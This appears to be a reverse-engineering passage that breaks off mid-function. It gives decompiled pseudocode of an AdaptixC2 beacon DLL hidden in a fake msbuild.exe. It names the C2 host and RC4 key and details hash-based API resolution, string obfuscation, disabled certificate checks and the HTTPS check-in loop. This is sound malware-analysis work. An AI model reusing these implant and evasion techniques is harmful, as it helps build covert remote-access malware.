/*
 * Decompiled from: extracted_pe.dll (file.dll)
 *
 * AdaptixC2 beacon agent — compiled from https://github.com/Adaptix-Framework/AdaptixC2
 * Full-featured C2 beacon with 35 commands.
 * Extracted from PNG steganography inside the outer PE (msbuild.exe).
 * Export: _Z11GetVersionsv (C++ mangled GetVersions) — matches AdaptixC2 main.cpp
 * RTTI classes: ConnectorHTTP, Connector — matches AdaptixC2 ConnectorHTTP.h
 *
 * C2: checkmarx[.]zone:8443 via HTTPS POST to /telemetry/checkmarx.json
 * Config: RC4-encrypted in .rdata, key: 331ab9c032cf95c89d877ee05b46f8d8
 */

/*
 * get_encrypted_config_ptr @ 35d441000
 *
 * Returns pointer to the RC4-encrypted C2 config blob in .rdata section.
 * Format: [LE uint32 size=229][encrypted_data][16-byte RC4 key]
 * Total size returned by get_encrypted_config_size = 0xf9 (249 bytes).
 */

undefined * get_encrypted_config_ptr(void)

{
  return &ENCRYPTED_CONFIG_BLOB;
}



/* get_encrypted_config_size @ 35d44100d */

undefined8 get_encrypted_config_size(void)

{
  return 0xf9;
}



/* is_digit @ 35d441030 */

undefined1 is_digit(char param_1)

{
  undefined1 uVar1;
  
  if ((param_1 < '0') || ('9' < param_1)) {
    uVar1 = 0;
  }
  else {
    uVar1 = 1;
  }
  return uVar1;
}



/* parse_int_atoi @ 35d441056 */

int parse_int_atoi(longlong param_1)

{
  undefined1 uVar1;
  int iVar2;
  undefined7 extraout_var;
  int local_14;
  int local_10;
  int local_c;
  
  local_c = 0;
  local_10 = 1;
  for (local_14 = 0; *(char *)(param_1 + local_14) == ' '; local_14 = local_14 + 1) {
  }
  if ((*(char *)(param_1 + local_14) == '-') || (*(char *)(param_1 + local_14) == '+')) {
    if (*(char *)(param_1 + local_14) == '-') {
      local_10 = -1;
    }
    else {
      local_10 = 1;
    }
    local_14 = local_14 + 1;
  }
  while( true ) {
    uVar1 = is_digit(*(char *)(param_1 + local_14));
    if ((int)CONCAT71(extraout_var,uVar1) == 0) {
      return local_c * local_10;
    }
    iVar2 = *(char *)(param_1 + local_14) + -0x30;
    if ((0x7fffffff - iVar2) / 10 < local_c) break;
    local_c = iVar2 + local_c * 10;
    local_14 = local_14 + 1;
  }
  if (local_10 == 1) {
    return 0x7fffffff;
  }
  return -0x80000000;
}



/* heap_alloc_small @ 35d441182 */

undefined8 heap_alloc_small(undefined4 param_1)

{
  undefined8 uVar1;
  
  uVar1 = heap_alloc(param_1);
  return uVar1;
}



/* connector_http_cleanup @ 35d4411a3 */

void connector_http_cleanup(longlong param_1)

{
  longlong local_res8 [4];
  
  local_res8[0] = param_1;
  heap_realloc(local_res8,200);
  return;
}



/*
 * ConnectorHTTP_init @ 35d4411c0
 *
 * Constructor for the ConnectorHTTP C++ class. Performs:
 *   1. Sets vtable to VTABLE_ConnectorHTTP
 *   2. Allocates function pointer table (0x80 bytes) for WinINet APIs
 *   3. Copies LoadLibraryA, GetProcAddress, FreeLibrary, kernel32 helpers
 *   4. Builds "wininet.dll" char-by-char to evade static detection:
 *      0x77='w', 0x69='i', 0x6e='n', 0x69='i', 0x6e='n', 0x65='e', 0x74='t',
 *      0x2e='.', 0x64='d', 0x6c='l', 0x6c='l', 0x00='\0'
 *   5. LoadLibrary("wininet.dll"), then resolves 10 WinINet APIs by hash:
 *      0x4c383c80=InternetOpenA, 0x575708d8=InternetConnectA,
 *      0x226c0d80=HttpOpenRequestA, 0xc2c06958=HttpSendRequestA,
 *      0x2e652253=HttpAddRequestHeadersA, 0x4f0bddbd=InternetSetOptionA,
 *      0xd7775c67=InternetQueryOptionA, 0x9ed7669e=HttpQueryInfoA,
 *      0xc0d1320f=InternetCloseHandle, 0x0e64c229=InternetReadFile
 */

void ConnectorHTTP_init(undefined8 *param_1)

{
  undefined8 uVar1;
  undefined8 *puVar2;
  undefined1 local_1c;
  undefined1 local_1b;
  undefined1 local_1a;
  undefined1 local_19;
  undefined1 local_18;
  undefined1 local_17;
  undefined1 local_16;
  undefined1 local_15;
  undefined1 local_14;
  undefined1 local_13;
  undefined1 local_12;
  undefined1 local_11;
  longlong local_10;
  
  connector_base_init(param_1);
  *param_1 = &VTABLE_ConnectorHTTP;
  *(undefined4 *)(param_1 + 1) = 0;
  param_1[2] = 0;
  *(undefined4 *)(param_1 + 3) = 0;
  *(undefined4 *)((longlong)param_1 + 0x1c) = 0;
  param_1[4] = 0;
  *(undefined4 *)(param_1 + 5) = 0;
  *(undefined4 *)((longlong)param_1 + 0x2c) = 0;
  param_1[6] = 0;
  *(undefined4 *)(param_1 + 7) = 0;
  param_1[8] = 0;
  param_1[9] = 0;
  *(undefined4 *)(param_1 + 10) = 0;
  param_1[0xb] = 0;
  *(undefined4 *)(param_1 + 0xc) = 0;
  param_1[0xd] = 0;
  *(undefined4 *)(param_1 + 0xe) = 0;
  *(undefined4 *)((longlong)param_1 + 0x74) = 0;
  *(undefined1 *)(param_1 + 0xf) = 0;
  param_1[0x10] = 0;
  *(undefined4 *)(param_1 + 0x11) = 0;
  *(undefined1 *)((longlong)param_1 + 0x8c) = 0;
  param_1[0x12] = 0;
  param_1[0x13] = 0;
  param_1[0x14] = 0;
  param_1[0x15] = 0;
  param_1[0x16] = 0;
  param_1[0x17] = 0;
  *(undefined4 *)(param_1 + 0x18) = 0;
  uVar1 = (**(code **)(g_win32_api_table + 0x160))(0x40,0x80);
  param_1[0x15] = uVar1;
  *(undefined8 *)param_1[0x15] = *(undefined8 *)(g_win32_api_table + 0x160);
  *(undefined8 *)(param_1[0x15] + 8) = *(undefined8 *)(g_win32_api_table + 0x170);
  *(undefined8 *)(param_1[0x15] + 0x10) = *(undefined8 *)(g_win32_api_table + 0x168);
  *(undefined8 *)(param_1[0x15] + 0x18) = *(undefined8 *)(g_win32_api_table + 0x158);
  *(undefined8 *)(param_1[0x15] + 0x28) = *(undefined8 *)(g_win32_api_table + 0xd0);
  local_1c = char_identity_antistatic(0x77);
  local_1b = char_identity_antistatic(0x69);
  local_1a = char_identity_antistatic(0x6e);
  local_19 = char_identity_antistatic(0x69);
  local_18 = char_identity_antistatic(0x6e);
  local_17 = char_identity_antistatic(0x65);
  local_16 = char_identity_antistatic(0x74);
  local_15 = char_identity_antistatic(0x2e);
  local_14 = char_identity_antistatic(100);
  local_13 = char_identity_antistatic(0x6c);
  local_12 = char_identity_antistatic(0x6c);
  local_11 = char_identity_antistatic(0);
  local_10 = (**(code **)(param_1[0x15] + 0x18))(&local_1c);
  if (local_10 != 0) {
    puVar2 = resolve_export_by_hash(local_10,0x4c383c80);
    *(undefined8 **)(param_1[0x15] + 0x30) = puVar2;
    puVar2 = resolve_export_by_hash(local_10,0x575708d8);
    *(undefined8 **)(param_1[0x15] + 0x38) = puVar2;
    puVar2 = resolve_export_by_hash(local_10,0x226c0d80);
    *(undefined8 **)(param_1[0x15] + 0x40) = puVar2;
    puVar2 = resolve_export_by_hash(local_10,-0x3d3f96a8);
    *(undefined8 **)(param_1[0x15] + 0x48) = puVar2;
    puVar2 = resolve_export_by_hash(local_10,0x2e652253);
    *(undefined8 **)(param_1[0x15] + 0x50) = puVar2;
    puVar2 = resolve_export_by_hash(local_10,0x4f0bddbd);
    *(undefined8 **)(param_1[0x15] + 0x58) = puVar2;
    puVar2 = resolve_export_by_hash(local_10,-0x2888a399);
    *(undefined8 **)(param_1[0x15] + 0x60) = puVar2;
    puVar2 = resolve_export_by_hash(local_10,-0x61289962);
    *(undefined8 **)(param_1[0x15] + 0x68) = puVar2;
    puVar2 = resolve_export_by_hash(local_10,-0x3f2ecdf1);
    *(undefined8 **)(param_1[0x15] + 0x70) = puVar2;
    puVar2 = resolve_export_by_hash(local_10,0xe64c229);
    *(undefined8 **)(param_1[0x15] + 0x78) = puVar2;
  }
  return;
}



/*
 * http_beacon_send @ 35d441dc6
 *
 * Core HTTP C2 beacon function (ConnectorHTTP::send). For each server:
 *   1. InternetOpenA with configured User-Agent
 *   2. InternetConnectA to server:port (proxy support via config flag)
 *   3. HttpOpenRequestA with POST method and URI
 *   4. Sets Accept: */* and custom X-Content-ID header
 *   5. If SSL: sets 0x84C80200 flags and disables all cert validation (0x3380)
 *   6. HttpSendRequestA with RC4-encrypted beacon payload
 *   7. Checks HTTP 200 via HttpQueryInfoA(0x13)
 *   8. Reads response: Content-Length path or chunked HeapReAlloc loop
 *   9. On failure: closes handles, rotates to next server
 *
 * Builds "Host: server:port\r\n" byte-by-byte. Port appended only if
 * non-default (443 for HTTPS, 80 for HTTP).
 */

/* WARNING: Type propagation algorithm not settling */

void http_beacon_send(longlong param_1,undefined8 param_2,undefined4 param_3)

{
  code *pcVar1;
  bool bVar2;
  int iVar3;
  uint uVar4;
  undefined8 uVar5;
  longlong in_stack_fffffffffffffdf0;
  undefined4 uVar6;
  undefined1 local_1f0 [256];
  int local_f0;
  int local_ec;
  int local_e8;
  undefined4 local_e4;
  undefined4 local_e0;
  uint local_dc [2];
  char acStack_d4 [6];
  char local_ce [6];
  undefined4 local_c8;
  uint local_c4;
  undefined4 *local_c0;
  undefined8 local_b8;
  undefined4 local_b0;
  undefined4 local_ac;
  longlong local_a8;
  int local_9c;
  int local_98;
  ushort local_92;
  uint local_90;
  uint local_8c;
  undefined8 *local_88;
  longlong local_80;
  undefined8 local_78;
  undefined8 local_70;
  undefined4 local_68;
  int local_64;
  longlong local_60;
  uint local_58;
  uint local_54;
  uint local_50;
  int local_4c;
  int local_48;
  ushort local_42;
  uint local_40;
  int local_3c;
  uint local_38;
  int local_34;
  ulonglong *local_30;
  ulonglong *local_28;
  undefined4 local_1c;
  int local_18;
  uint local_14;
  
  *(undefined4 *)(param_1 + 0x88) = 0;
  *(undefined8 *)(param_1 + 0x80) = 0;
  local_14 = 0;
  local_18 = 0;
  local_64 = 0;
  local_ac = 0;
  if (*(longlong *)(param_1 + 0xb8) != 0) {
    (**(code **)(*(longlong *)(param_1 + 0xa8) + 0x70))(*(undefined8 *)(param_1 + 0xb8));
    *(undefined8 *)(param_1 + 0xb8) = 0;
  }
  if (*(longlong *)(param_1 + 0xb0) != 0) {
    (**(code **)(*(longlong *)(param_1 + 0xa8) + 0x70))(*(undefined8 *)(param_1 + 0xb0));
    *(undefined8 *)(param_1 + 0xb0) = 0;
  }
  do {
    do {
      if ((local_18 != 0) || (*(uint *)(param_1 + 0x38) <= local_14)) {
        return;
      }
      local_68 = 0;
      if (*(longlong *)(param_1 + 0xb0) == 0) {
        local_70 = *(undefined8 *)
                    ((ulonglong)*(uint *)(param_1 + 0x18) * 8 + *(longlong *)(param_1 + 0x10));
        uVar4 = (uint)((ulonglong)in_stack_fffffffffffffdf0 >> 0x20);
        if (*(longlong *)(param_1 + 0x90) == 0) {
          in_stack_fffffffffffffdf0 = (ulonglong)uVar4 << 0x20;
          uVar5 = (**(code **)(*(longlong *)(param_1 + 0xa8) + 0x30))
                            (local_70,0,0,0,in_stack_fffffffffffffdf0);
          *(undefined8 *)(param_1 + 0xb0) = uVar5;
        }
        else {
          in_stack_fffffffffffffdf0 = (ulonglong)uVar4 << 0x20;
          uVar5 = (**(code **)(*(longlong *)(param_1 + 0xa8) + 0x30))
                            (local_70,3,*(undefined8 *)(param_1 + 0x90),0,in_stack_fffffffffffffdf0)
          ;
          *(undefined8 *)(param_1 + 0xb0) = uVar5;
        }
      }
    } while (*(longlong *)(param_1 + 0xb0) == 0);
    if (*(longlong *)(param_1 + 0xb8) == 0) {
      in_stack_fffffffffffffdf0 = 0;
      uVar5 = (**(code **)(*(longlong *)(param_1 + 0xa8) + 0x38))
                        (*(undefined8 *)(param_1 + 0xb0),
                         *(undefined8 *)
                          ((ulonglong)*(uint *)(param_1 + 0xc0) * 8 + *(longlong *)(param_1 + 0x40))
                         ,*(undefined2 *)
                           ((ulonglong)*(uint *)(param_1 + 0xc0) * 2 + *(longlong *)(param_1 + 0x48)
                           ),0,0,3,0,&local_ac);
      *(undefined8 *)(param_1 + 0xb8) = uVar5;
    }
    if (*(longlong *)(param_1 + 0xb8) != 0) {
      local_b0 = 0x2a2f2a;
      local_b8 = 0;
      local_c0 = &local_b0;
      local_1c = 0x84480200;
      if (*(int *)(param_1 + 0x2c) != 0) {
        local_1c = 0x84c80200;
      }
      local_78 = *(undefined8 *)
                  ((ulonglong)*(uint *)(param_1 + 0x60) * 8 + *(longlong *)(param_1 + 0x58));
      in_stack_fffffffffffffdf0 = 0;
      local_80 = (**(code **)(*(longlong *)(param_1 + 0xa8) + 0x40))
                           (*(undefined8 *)(param_1 + 0xb8),*(undefined8 *)(param_1 + 0x30),local_78
                            ,0,0,&local_c0,local_1c,&local_ac);
      uVar6 = (undefined4)((ulonglong)in_stack_fffffffffffffdf0 >> 0x20);
      if (local_80 != 0) {
        if (*(int *)(param_1 + 0x2c) != 0) {
          local_c4 = 0;
          local_c8 = 4;
          local_64 = (**(code **)(*(longlong *)(param_1 + 0xa8) + 0x58))
                               (local_80,0x1f,&local_c4,&local_c8);
          if (local_64 == 0) {
            local_c4 = 0;
          }
          local_c4 = local_c4 | 0x3380;
          (**(code **)(*(longlong *)(param_1 + 0xa8) + 0x50))(local_80,0x1f,&local_c4,4);
        }
        if ((*(char *)(param_1 + 0x8c) != '\0') && (*(longlong *)(param_1 + 0x98) != 0)) {
          pcVar1 = *(code **)(*(longlong *)(param_1 + 0xa8) + 0x50);
          iVar3 = strlen_wrapper(*(longlong *)(param_1 + 0x98));
          (*pcVar1)(local_80,0x2b,*(undefined8 *)(param_1 + 0x98),iVar3);
          if (*(longlong *)(param_1 + 0xa0) != 0) {
            pcVar1 = *(code **)(*(longlong *)(param_1 + 0xa8) + 0x50);
            iVar3 = strlen_wrapper(*(longlong *)(param_1 + 0xa0));
            (*pcVar1)(local_80,0x2c,*(undefined8 *)(param_1 + 0xa0),iVar3);
          }
        }
        local_28 = *(ulonglong **)(param_1 + 0x68);
        local_30 = (ulonglong *)0x0;
        if (*(int *)(param_1 + 0x1c) != 0) {
          local_88 = *(undefined8 **)
                      ((ulonglong)*(uint *)(param_1 + 0x28) * 8 + *(longlong *)(param_1 + 0x20));
          local_8c = strlen_wrapper((longlong)local_88);
          local_90 = strlen_wrapper(*(longlong *)(param_1 + 0x68));
          local_92 = *(ushort *)
                      ((ulonglong)*(uint *)(param_1 + 0xc0) * 2 + *(longlong *)(param_1 + 0x48));
          local_34 = 0;
          for (local_38 = 0; local_38 < local_8c; local_38 = local_38 + 1) {
            if (*(char *)((longlong)local_88 + (ulonglong)local_38) == ':') {
              local_34 = 1;
              break;
            }
          }
          local_3c = 0;
          local_ce[0] = '\0';
          local_ce[1] = '\0';
          local_ce[2] = '\0';
          local_ce[3] = '\0';
          local_ce[4] = '\0';
          local_ce[5] = '\0';
          local_40 = 0;
          if ((local_34 == 0) &&
             (((*(int *)(param_1 + 0x2c) != 0 && (local_92 != 0x1bb)) ||
              ((*(int *)(param_1 + 0x2c) == 0 && (local_92 != 0x50)))))) {
            local_3c = 1;
            local_42 = local_92;
            if (local_92 == 0) {
              local_40 = 1;
                    /* WARNING: Ignoring partial resolution of indirect */
              local_ce[0] = '0';
            }
            else {
              local_48 = 0;
              for (; iVar3 = local_48, local_42 != 0; local_42 = local_42 / 10) {
                local_48 = local_48 + 1;
                acStack_d4[iVar3] = (char)local_42 + (char)(local_42 / 10) * -10 + '0';
              }
              for (local_4c = local_48 + -1; uVar4 = local_40, -1 < local_4c;
                  local_4c = local_4c + -1) {
                local_40 = local_40 + 1;
                local_ce[uVar4] = acStack_d4[local_4c];
              }
            }
            local_ce[local_40] = '\0';
          }
          if (local_3c == 0) {
            iVar3 = 0;
          }
          else {
            iVar3 = local_40 + 1;
          }
          local_98 = local_90 + iVar3 + local_8c + 9;
          local_30 = (ulonglong *)(*(code *)**(undefined8 **)(param_1 + 0xa8))(0x40,local_98);
          *(undefined1 *)local_30 = 0x48;
          *(undefined1 *)((longlong)local_30 + 1) = 0x6f;
          *(undefined1 *)((longlong)local_30 + 2) = 0x73;
          *(undefined1 *)((longlong)local_30 + 3) = 0x74;
          *(undefined1 *)((longlong)local_30 + 4) = 0x3a;
          local_50 = 6;
          *(undefined1 *)((longlong)local_30 + 5) = 0x20;
          memcpy_wrapper((undefined8 *)((longlong)local_30 + 6),local_88,(ulonglong)local_8c);
          uVar4 = local_50 + local_8c;
          local_50 = uVar4;
          if (local_3c != 0) {
            local_50 = uVar4 + 1;
            *(undefined1 *)((ulonglong)uVar4 + (longlong)local_30) = 0x3a;
            memcpy_wrapper((undefined8 *)((ulonglong)local_50 + (longlong)local_30),
                          (undefined8 *)local_ce,(ulonglong)local_40);
            local_50 = local_50 + local_40;
          }
          uVar4 = local_50 + 1;
          *(undefined1 *)((ulonglong)local_50 + (longlong)local_30) = 0xd;
          local_50 = local_50 + 2;
          *(undefined1 *)((ulonglong)uVar4 + (longlong)local_30) = 10;
          memcpy_wrapper((undefined8 *)((ulonglong)local_50 + (longlong)local_30),
                        *(undefined8 **)(param_1 + 0x68),(ulonglong)local_90);
          local_50 = local_50 + local_90;
          *(undefined1 *)((longlong)local_30 + (ulonglong)local_50) = 0;
          local_28 = local_30;
        }
        pcVar1 = *(code **)(*(longlong *)(param_1 + 0xa8) + 0x48);
        iVar3 = strlen_wrapper((longlong)local_28);
        in_stack_fffffffffffffdf0 = CONCAT44(uVar6,param_3);
        local_18 = (*pcVar1)(local_80,local_28,iVar3,param_2,in_stack_fffffffffffffdf0);
        if (local_30 != (ulonglong *)0x0) {
          uVar4 = strlen_wrapper((longlong)local_30);
          memset_wrapper(local_30,0,(ulonglong)uVar4);
          (**(code **)(*(longlong *)(param_1 + 0xa8) + 0x10))(local_30);
        }
        if (local_18 == 0) {
          local_68 = (**(code **)(*(longlong *)(param_1 + 0xa8) + 0x28))();
        }
        else {
          local_dc[1] = 0xff;
          in_stack_fffffffffffffdf0 = 0;
          local_9c = (**(code **)(*(longlong *)(param_1 + 0xa8) + 0x60))
                               (local_80,0x13,local_1f0,local_dc + 1,0);
          if (local_9c == 0) {
LAB_35d4428e7:
            bVar2 = false;
          }
          else {
            iVar3 = parse_int_atoi((longlong)local_1f0);
            if (iVar3 != 200) goto LAB_35d4428e7;
            bVar2 = true;
          }
          if (bVar2) {
            local_dc[0] = 0;
            local_e0 = 4;
            in_stack_fffffffffffffdf0 = 0;
            local_9c = (**(code **)(*(longlong *)(param_1 + 0xa8) + 0x60))
                                 (local_80,0x20000005,local_dc,&local_e0,0);
            if (local_9c == 0) {
              iVar3 = (**(code **)(*(longlong *)(param_1 + 0xa8) + 0x28))();
              if (iVar3 == 0x2f76) {
                local_58 = 0;
                local_ec = 0;
                local_60 = (*(code *)**(undefined8 **)(param_1 + 0xa8))(0x40,0);
                local_f0 = 0;
                while( true ) {
                  local_9c = (**(code **)(*(longlong *)(param_1 + 0xa8) + 0x68))
                                       (local_80,&local_f0,0,0);
                  if ((local_9c == 0) || (local_f0 == 0)) break;
                  local_60 = (**(code **)(*(longlong *)(param_1 + 0xa8) + 8))
                                       (local_60,local_58 + local_f0,2);
                  local_9c = (**(code **)(*(longlong *)(param_1 + 0xa8) + 0x78))
                                       (local_80,(ulonglong)local_58 + local_60,local_f0,&local_ec);
                  if ((local_9c == 0) || (local_ec == 0)) break;
                  local_58 = local_58 + local_ec;
                }
                if (local_58 == 0) {
                  (**(code **)(*(longlong *)(param_1 + 0xa8) + 0x10))(local_60);
                }
                else {
                  *(uint *)(param_1 + 0x88) = local_58;
                  *(longlong *)(param_1 + 0x80) = local_60;
                }
              }
            }
            else {
              local_e4 = 0;
              local_9c = (**(code **)(*(longlong *)(param_1 + 0xa8) + 0x68))(local_80,&local_e4,0,0)
              ;
              if ((local_9c != 0) && (local_dc[0] != 0)) {
                local_54 = 0;
                local_e8 = 0;
                local_a8 = (*(code *)**(undefined8 **)(param_1 + 0xa8))(0x40,local_dc[0]);
                for (; local_54 < local_dc[0]; local_54 = local_54 + local_e8) {
                  local_9c = (**(code **)(*(longlong *)(param_1 + 0xa8) + 0x78))
                                       (local_80,(ulonglong)local_54 + local_a8,local_e4,&local_e8);
                  if ((local_9c == 0) || (local_e8 == 0)) break;
                }
                *(uint *)(param_1 + 0x88) = local_54;
                *(longlong *)(param_1 + 0x80) = local_a8;
              }
            }
          }
        }
        (**(code **)(*(longlong *)(param_1 + 0xa8) + 0x70))(local_80);
      }
    }
    local_14 = local_14 + 1;
    if (local_18 == 0) {
      if (*(longlong *)(param_1 + 0xb8) != 0) {
        (**(code **)(*(longlong *)(param_1 + 0xa8) + 0x70))(*(undefined8 *)(param_1 + 0xb8));
        *(undefined8 *)(param_1 + 0xb8) = 0;
      }
      if (*(longlong *)(param_1 + 0xb0) != 0) {
        (**(code **)(*(longlong *)(param_1 + 0xa8) + 0x70))(*(undefined8 *)(param_1 + 0xb0));
        *(undefined8 *)(param_1 + 0xb0) = 0;
      }
      (**(code **)(*(longlong *)(param_1 + 0xa8) + 0x50))(0,0x27,0,0);
      (**(code **)(*(longlong *)(param_1 + 0xa8) + 0x50))(0,0x25,0,0);
      *(uint *)(param_1 + 0xc0) = (*(int *)(param_1 + 0xc0) + 1U) % *(uint *)(param_1 + 0x38);
    }
    if (*(char *)(param_1 + 0x78) == '\x01') {
      uVar4 = prng_next();
      *(uint *)(param_1 + 0x60) = uVar4 % *(uint *)(param_1 + 0x50);
      uVar4 = prng_next();
      *(uint *)(param_1 + 0x18) = uVar4 % *(uint *)(param_1 + 8);
      uVar4 = prng_next();
      *(uint *)(param_1 + 0xc0) = uVar4 % *(uint *)(param_1 + 0x38);
      if (*(int *)(param_1 + 0x1c) != 0) {
        uVar4 = prng_next();
        *(uint *)(param_1 + 0x28) = uVar4 % *(uint *)(param_1 + 0x1c);
      }
    }
    else {
      *(uint *)(param_1 + 0x60) = (*(int *)(param_1 + 0x60) + 1U) % *(uint *)(param_1 + 0x50);
      *(uint *)(param_1 + 0x18) = (*(int *)(param_1 + 0x18) + 1U) % *(uint *)(param_1 + 8);
      *(uint *)(param_1 + 0xc0) = (*(int *)(param_1 + 0xc0) + 1U) % *(uint *)(param_1 + 0x38);
      if (*(int *)(param_1 + 0x1c) != 0) {
        *(uint *)(param_1 + 0x28) = (*(int *)(param_1 + 0x28) + 1U) % *(uint *)(param_1 + 0x1c);
      }
    }
  } while( true );
}



/* implant_state_alloc @ 35d443170 */

undefined8 implant_state_alloc(undefined4 param_1)

{
  undefined8 uVar1;
  
  uVar1 = heap_alloc(param_1);
  return uVar1;
}



/*
 * implant_state_init @ 35d4431ae
 *
 * Allocates and initializes the main implant state structure (g_implant_state).
 * Sets up:
 *   - Config parser (parse_rc4_config) at offset [1]
 *   - Command handler at offset [2]
 *   - Job tracker subsystem at offset [3]
 *   - SOCKS proxy subsystem at offsets [4], [5]
 *   - P2P mesh subsystem at offsets [6], [7]
 *   - 16-byte random session ID at offset [0xd]
 *   - Beacon active flag at offset [0xe]
 */

void implant_state_init(undefined8 *param_1)

{
  undefined4 uVar1;
  undefined4 *puVar2;
  undefined8 *puVar3;
  undefined8 uVar4;
  int local_1c;
  
  *param_1 = 0;
  param_1[1] = 0;
  param_1[2] = 0;
  param_1[3] = 0;
  param_1[4] = 0;
  param_1[5] = 0;
  param_1[6] = 0;
  param_1[7] = 0;
  param_1[8] = 0;
  critical_section_init(param_1 + 9);
  param_1[0xd] = 0;
  *(undefined4 *)(param_1 + 0xe) = 1;
  puVar2 = (undefined4 *)host_fingerprint_alloc(0x50);
  host_fingerprint_init(puVar2);
  *param_1 = puVar2;
  puVar2 = (undefined4 *)config_struct_alloc(200);
  parse_rc4_config(puVar2);
  param_1[1] = puVar2;
  puVar3 = (undefined8 *)socks_proxy_cleanup_init(8);
  command_handler_init(puVar3,param_1);
  param_1[2] = puVar3;
  puVar3 = (undefined8 *)job_tracker_alloc(0x28);
  job_tracker_init(puVar3,*(undefined4 *)(param_1[1] + 0x28));
  param_1[3] = puVar3;
  puVar3 = (undefined8 *)subsystem_alloc_generic(0x20);
  *puVar3 = 0;
  puVar3[1] = 0;
  puVar3[2] = 0;
  puVar3[3] = 0;
  linked_list_init(puVar3);
  param_1[4] = puVar3;
  puVar3 = (undefined8 *)alloc_wrapper_small(0x20);
  connector_state_init(puVar3);
  param_1[5] = puVar3;
  puVar3 = (undefined8 *)p2p_link_alloc(0x20);
  *puVar3 = 0;
  puVar3[1] = 0;
  puVar3[2] = 0;
  puVar3[3] = 0;
  linked_list_init_3(puVar3);
  param_1[6] = puVar3;
  puVar3 = (undefined8 *)alloc_wrapper_32(0x20);
  *puVar3 = 0;
  puVar3[1] = 0;
  puVar3[2] = 0;
  puVar3[3] = 0;
  linked_list_init_2(puVar3);
  param_1[7] = puVar3;
  uVar4 = heap_alloc(0x10);
  param_1[0xd] = uVar4;
  for (local_1c = 0; local_1c < 0x10; local_1c = local_1c + 1) {
    uVar1 = prng_next();
    *(char *)((longlong)local_1c + param_1[0xd]) = (char)uVar1;
  }
  return;
}



/* is_beacon_active @ 35d4433ee */

undefined1 is_beacon_active(longlong param_1)

{
  undefined1 uVar1;
  uint uVar2;
  
  uVar2 = get_tick_count();
  if ((*(int *)(param_1 + 0x70) == 0) ||
     ((*(int *)(*(longlong *)(param_1 + 8) + 0x18) != 0 &&
      (*(uint *)(*(longlong *)(param_1 + 8) + 0x18) <= uVar2)))) {
    uVar1 = 0;
  }
  else {
    uVar1 = 1;
  }
  return uVar1;
}



/* calculate_sleep_seconds @ 35d44343e */

int calculate_sleep_seconds(longlong param_1)

{
  int iVar1;
  undefined8 local_30;
  undefined8 local_28;
  ushort local_1c;
  ushort local_1a;
  ushort local_18;
  ushort local_16;
  int local_14;
  
  if (*(int *)(*(longlong *)(param_1 + 8) + 0x1c) == 0) {
    iVar1 = 0;
  }
  else {
    local_16 = (ushort)*(undefined4 *)(*(longlong *)(param_1 + 8) + 0x1c) & 0x3f;
    local_18 = (ushort)((uint)*(undefined4 *)(*(longlong *)(param_1 + 8) + 0x1c) >> 8) & 0x3f;
    local_1a = (ushort)((uint)*(undefined4 *)(*(longlong *)(param_1 + 8) + 0x1c) >> 0x10) & 0x3f;
    local_1c = (byte)((uint)*(undefined4 *)(*(longlong *)(param_1 + 8) + 0x1c) >> 0x18) & 0x3f;
    local_14 = 0;
    local_30 = 0;
    local_28 = 0;
    (**(code **)(g_win32_api_table + 0x100))(&local_30);
    if ((ushort)local_28 < local_1c) {
      local_14 = ((uint)local_1c - (uint)(ushort)local_28) * 0x3c +
                 ((uint)local_1a - (uint)local_28._2_2_);
    }
    else if (local_18 < (ushort)local_28) {
      local_14 = (((uint)(ushort)local_28 + (uint)(ushort)local_28 * -0x10) * 4 -
                 (uint)local_28._2_2_) + 0x5a0 + (uint)local_1a + (uint)local_1c * 0x3c;
    }
    else if ((local_1c == (ushort)local_28) && (local_28._2_2_ < local_1a)) {
      local_14 = (uint)local_1a - (uint)local_28._2_2_;
    }
    else {
      if ((local_18 != (ushort)local_28) || (local_28._2_2_ < local_16)) {
        return 0;
      }
      local_14 = ((uint)local_1a - (uint)local_28._2_2_) + 0x5a0;
    }
    iVar1 = local_14 * 0x3c - (uint)local_28._4_2_;
  }
  return iVar1;
}



/*
 * serialize_beacon_metadata @ 35d4435ee
 *
 * Builds the binary beacon check-in packet sent to C2. Packs:
 *   config ID, session flags, 4 timing params, 2 port fields,
 *   status byte, 2 architecture fields, beacon counter,
 *   capability bitmap (4 booleans → 1 byte), 16-byte session ID,
 *   and 4 length-prefixed config strings (server, URI, header, UA).
 * The entire blob is RC4-encrypted before transmission.
 */

undefined8 serialize_beacon_metadata(longlong *param_1,undefined4 *param_2)

{
  undefined4 uVar1;
  undefined4 uVar2;
  undefined4 uVar3;
  longlong lVar4;
  int iVar5;
  uint uVar6;
  undefined4 uVar7;
  int *piVar8;
  longlong lVar9;
  undefined8 uVar10;
  
  uVar7 = *(undefined4 *)(*param_1 + 0x1c);
  uVar1 = *(undefined4 *)(*param_1 + 0x18);
  uVar2 = *(undefined4 *)(*param_1 + 0x14);
  uVar3 = *(undefined4 *)(*param_1 + 0x10);
  piVar8 = (int *)binary_buffer_alloc(0x18);
  binary_buffer_init_empty(piVar8);
  binary_buffer_write_uint32(piVar8,*(undefined4 *)param_1[1]);
  binary_buffer_write_uint32(piVar8,*(undefined4 *)*param_1);
  binary_buffer_write_uint32(piVar8,*(undefined4 *)(param_1[1] + 0x10));
  binary_buffer_write_uint32(piVar8,*(undefined4 *)(param_1[1] + 0x14));
  binary_buffer_write_uint32(piVar8,*(undefined4 *)(param_1[1] + 0x18));
  binary_buffer_write_uint32(piVar8,*(undefined4 *)(param_1[1] + 0x1c));
  binary_buffer_write_uint16(piVar8,*(undefined2 *)(*param_1 + 4));
  binary_buffer_write_uint16(piVar8,*(undefined2 *)(*param_1 + 6));
  binary_buffer_write_byte(piVar8,*(undefined1 *)(*param_1 + 8));
  binary_buffer_write_uint16(piVar8,*(undefined2 *)(*param_1 + 10));
  binary_buffer_write_uint16(piVar8,*(undefined2 *)(*param_1 + 0xc));
  binary_buffer_write_uint32(piVar8,(uint)*(ushort *)(*param_1 + 0x24));
  binary_buffer_write_byte(piVar8,(char)*(undefined2 *)(*param_1 + 0x20));
  binary_buffer_write_byte(piVar8,(char)*(undefined2 *)(*param_1 + 0x22));
  binary_buffer_write_uint32(piVar8,*(undefined4 *)(*param_1 + 0x28));
  binary_buffer_write_byte(piVar8,(((char)uVar7 * '\x02' + (char)uVar1) * '\x02' + (char)uVar2) * '\x02' +
                       (char)uVar3);
  binary_buffer_write_bytes(piVar8,(undefined8 *)param_1[0xd],0x10);
  binary_buffer_write_string(piVar8,*(undefined8 **)(*param_1 + 0x38));
  binary_buffer_write_string(piVar8,*(undefined8 **)(*param_1 + 0x40));
